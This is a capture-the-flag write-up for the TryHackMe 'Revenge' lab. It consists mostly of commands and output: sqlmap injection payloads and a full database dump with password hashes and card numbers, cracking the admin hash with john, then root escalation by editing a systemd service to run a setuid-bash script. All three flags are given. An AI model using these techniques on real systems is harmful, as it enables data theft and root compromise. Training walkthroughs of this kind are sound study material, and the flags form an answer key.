

# Revenge -TryHackMe

>## { Author: RjRaju }

<!--
Flag1
` thm{br3ak1ng_4nd_3nt3r1ng} ` 

Flag2
` thm{4lm0st_th3re} `

Flag3.txt
` thm{m1ss10n_acc0mpl1sh3d} `
-->
---

```
sqlmap -u http://revenge.thm/products/1 --current-db
```

duckyinc

sqlmap -u http://revenge.thm/products/1 -D duckyinc --tables

Database: duckyinc
[3 tables]
+-------------+
| system_user |
| user        |
| product     |
+-------------+

```
$ sqlmap -u http://revenge.thm/products/1 -D duckyinc --dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.5.7#pip}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:33:21 /2022-02-23/

[10:33:21] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] 

[10:33:22] [INFO] resuming back-end DBMS 'mysql' 
[10:33:22] [INFO] testing connection to the target URL
[10:33:23] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://revenge.thm:80/products/1 AND 9528=9528

    Type: time-based blind
    Title: MySQL >= 5.0.12 RLIKE time-based blind
    Payload: http://revenge.thm:80/products/1 RLIKE SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: http://revenge.thm:80/products/-7835 UNION ALL SELECT 69,69,69,69,69,69,69,CONCAT(0x716a767071,0x50454d5669687649596e7a56436746496c4d4f6377666c57576a5a5a636f4d7368466e5264656943,0x71626a7a71)-- -
---
[10:33:23] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL >= 5.0.12
[10:33:23] [INFO] fetching tables for database: 'duckyinc'
[10:33:23] [INFO] fetching columns for table 'product' in database 'duckyinc'
[10:33:23] [INFO] fetching entries for table 'product' in database 'duckyinc'
Database: duckyinc
Table: product
[4 entries]
+----+----------+-----------------------+----------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+
| id | cost     | name                  | price    | details                                                                                                                                                                                                                                                                                                                 | in_stock | image_url                         | color_options             |
+----+----------+-----------------------+----------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+
| 1  | 50.00    | Box of Duckies        | 35.00    | Individual boxes of duckies! Boxes are sold only in the yellow color. This item is eligible for FAST shipping from one of our local warehouses. If you order before 2 PM on any weekday, we can guarantee that your order will be shipped out the same day.                                                             | Y        | images/box-of-duckies.png         | yellow                    |
| 2  | 500.00   | Dozen of Duckies      | 600.00   | Do you love a dozen donuts? Then you'll love a dozen boxes of duckies! This item is not eligible for FAST shipping. However, orders of this product are typically shipped out next day, provided they are ordered prior to 2 PM on any weekday.                                                                         | N        | images/dozen-boxes-of-duckies.png | yellow, blue, green, red  |
| 3  | 800.00   | Pallet of Duckies     | 1000.00  | Got lots of shelves to fill? Customers that want their duckies? Look no further than the pallet of duckies! This baby comes with 20 boxes of duckies in the colors of your choosing. Boxes can only contain one color ducky but multiple colors can be selected when you call to order. Just let your salesperson know. | N        | images/pallet.png                 | yellow, blue, red, orange |
| 4  | 15000.00 | Truck Load of Duckies | 22000.00 | This is it! Our largest order of duckies! You mean business with this order. You must have a ducky emporium if you need this many duckies. Due to the logistics with this type of order, FAST shipping is not available.\r\n\r\nActual truck not pictured.                                                              | Y        | images/truckload.png              | yellow, blue              |
+----+----------+-----------------------+----------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+

[10:33:23] [INFO] table 'duckyinc.product' dumped to CSV file '/home/veerendra/snap/sqlmap/23/.local/share/sqlmap/output/revenge.thm/dump/duckyinc/product.csv'
[10:33:23] [INFO] fetching columns for table 'system_user' in database 'duckyinc'
[10:33:24] [INFO] fetching entries for table 'system_user' in database 'duckyinc'
Database: duckyinc
Table: system_user
[3 entries]
+----+----------------------+--------------+--------------------------------------------------------------+
| id | email                | username     | _password                                                    |
+----+----------------------+--------------+--------------------------------------------------------------+
| 1  | sadmin@duckyinc.org  | server-admin | $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |
| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
+----+----------------------+--------------+--------------------------------------------------------------+

[10:33:24] [INFO] table 'duckyinc.`system_user`' dumped to CSV file '/home/veerendra/snap/sqlmap/23/.local/share/sqlmap/output/revenge.thm/dump/duckyinc/system_user.csv'
[10:33:24] [INFO] fetching columns for table 'user' in database 'duckyinc'
[10:33:25] [INFO] fetching entries for table 'user' in database 'duckyinc'
Database: duckyinc
Table: user
[10 entries]
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| id | email                           | company          | username | _password                                                    | credit_card                |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| 1  | sales@fakeinc.org               | Fake Inc         | jhenry   | $2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa | 4338736490565706           |
| 2  | accountspayable@ecorp.org       | Evil Corp        | smonroe  | $2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm | 355219744086163            |
| 3  | accounts.payable@mcdoonalds.org | McDoonalds Inc   | dross    | $2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C | 349789518019219            |
| 4  | sales@ABC.com                   | ABC Corp         | ngross   | $2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO | 4499108649937274           |
| 5  | sales@threebelow.com            | Three Below      | jlawlor  | $2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu | 4563593127115348           |
| 6  | ap@krasco.org                   | Krasco Org       | mandrews | $2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC | thm{br3ak1ng_4nd_3nt3r1ng} |
| 7  | payable@wallyworld.com          | Wally World Corp | dgorman  | $2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm | 4905698211632780           |
| 8  | payables@orlando.gov            | Orlando City     | mbutts   | $2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS | 4690248976187759           |
| 9  | sales@dollatwee.com             | Dolla Twee       | hmontana | $2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem | 375019041714434            |
| 10 | sales@ofamdollar                | O!  Fam Dollar   | csmith   | $2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36 | 364774395134471            |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+

[10:33:25] [INFO] table 'duckyinc.`user`' dumped to CSV file '/home/veerendra/snap/sqlmap/23/.local/share/sqlmap/output/revenge.thm/dump/duckyinc/user.csv'
[10:33:25] [INFO] fetched data logged to text files under '/home/veerendra/snap/sqlmap/23/.local/share/sqlmap/output/revenge.thm'
[10:33:25] [WARNING] your sqlmap version is outdated

[*] ending @ 10:33:25 /2022-02-23/
```

Flag 1
```
 thm{br3ak1ng_4nd_3nt3r1ng} 
```
```
$ cat hash-server-admin
$2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a
```

```
$ john hash-server-admin --wordlist=/opt/rockyou.txt 
Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
Press 'q' or Ctrl-C to abort, almost any other key for status
inuyasha         (?)
1g 0:00:00:02 100% 0.3802g/s 90.49p/s 90.49c/s 90.49C/s inuyasha..peaches
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
# SSH User & Passwd
```
server-admin : inuyasha
```
```
server-admin@duckyinc:~$ pwd
/home/server-admin
server-admin@duckyinc:~$ id
uid=1001(server-admin) gid=1001(server-admin) groups=1001(server-admin),33(www-data)
server-admin@duckyinc:~$ ls
flag2.txt
server-admin@duckyinc:~$ cat flag2.txt 
thm{4lm0st_th3re}
server-admin@duckyinc:~$ 
```

# Exploit
```
#!/bin/bash
cp /bin/bash /tmp/sh
chmod +s /tmp/sh
```
# Privs..
```
server-admin@duckyinc:~$ sudoedit /etc/systemd/system/duckyinc.service
```
```
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=root
Group=root
WorkingDirectory=/var/www/duckyinc
ExecStart=/bin/bash /tmp/exploit.sh
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target

```

```
server-admin@duckyinc:~$ sudoedit /etc/systemd/system/duckyinc.service
server-admin@duckyinc:~$ cd /tmp
server-admin@duckyinc:/tmp$ nano exploit.sh
server-admin@duckyinc:/tmp$ sudo /bin/systemctl daemon-reload 
server-admin@duckyinc:/tmp$ sudo /bin/systemctl restart duckyinc.service
server-admin@duckyinc:/tmp$ ls
exploit.sh  systemd-private-842d6bea9a2341d0b4189ab54ba60822-systemd-resolved.service-E9TTX8
sh          systemd-private-842d6bea9a2341d0b4189ab54ba60822-systemd-timesyncd.service-9Q3SzZ
server-admin@duckyinc:/tmp$ ./sh -p
sh-4.4# 
sh-4.4# id
uid=1001(server-admin) gid=1001(server-admin) euid=0(root) egid=0(root) groups=0(root),33(www-data),1001(server-admin)
sh-4.4# 
sh-4.4# cd /root
sh-4.4# ls
sh-4.4# ls -lah
total 52K
drwx------  7 root root 4.0K Aug 28  2020 .
drwxr-xr-x 24 root root 4.0K Aug  9  2020 ..
drwxr-xr-x  2 root root 4.0K Aug 12  2020 .bash_completion.d
lrwxrwxrwx  1 root root    9 Aug 10  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.2K Aug 12  2020 .bashrc
drwx------  3 root root 4.0K Aug  9  2020 .cache
drwx------  3 root root 4.0K Aug  9  2020 .gnupg
drwxr-xr-x  5 root root 4.0K Aug 12  2020 .local
-rw-------  1 root root  485 Aug 10  2020 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Aug 10  2020 .selected_editor
drwx------  2 root root 4.0K Aug  9  2020 .ssh
-rw-------  1 root root 7.6K Aug 12  2020 .viminfo
sh-4.4# pwd
/root
sh-4.4# bash
sh-4.4# cd /var/
sh-4.4# ls
backups  cache  crash  lib  local  lock  log  mail  opt  run  snap  spool  tmp  www
sh-4.4# 
sh-4.4# cd www
sh-4.4# ls
duckyinc
sh-4.4# cd duckyinc/
sh-4.4# 
sh-4.4# ls
__pycache__  app.py  requirements.txt  static  templates
sh-4.4# 
sh-4.4# ls -lah
total 28K
drwxr-x--- 5 flask-app www-data 4.0K Feb 23 05:17 .
drwxr-xr-x 3 root      root     4.0K Aug  9  2020 ..
drwxr-x--- 2 flask-app www-data 4.0K Aug 10  2020 __pycache__
-rw-r----- 1 flask-app www-data 2.4K Aug 10  2020 app.py
-rw-r----- 1 flask-app www-data  258 Aug  9  2020 requirements.txt
drwxr-x--- 7 flask-app www-data 4.0K Aug  9  2020 static
drwxr-x--- 2 flask-app www-data 4.0K Aug 28  2020 templates
sh-4.4# 
sh-4.4# cd static/
sh-4.4# 
sh-4.4# ls
css  fonts  images  js  webfonts
sh-4.4# cd ../templates/
sh-4.4# ls
404.html  500.html  admin.html  base.html  contact.html  index.html  login.html  product.html  products.html
sh-4.4# less index.html 
sh-4.4# mv index.html index.html.bak
sh-4.4# ls
404.html  500.html  admin.html  base.html  contact.html  index.html.bak  login.html  product.html  products.html
sh-4.4# cd /root
sh-4.4# ls
flag3.txt
sh-4.4# cat flag3.txt 
thm{m1ss10n_acc0mpl1sh3d}
sh-4.4# 
```





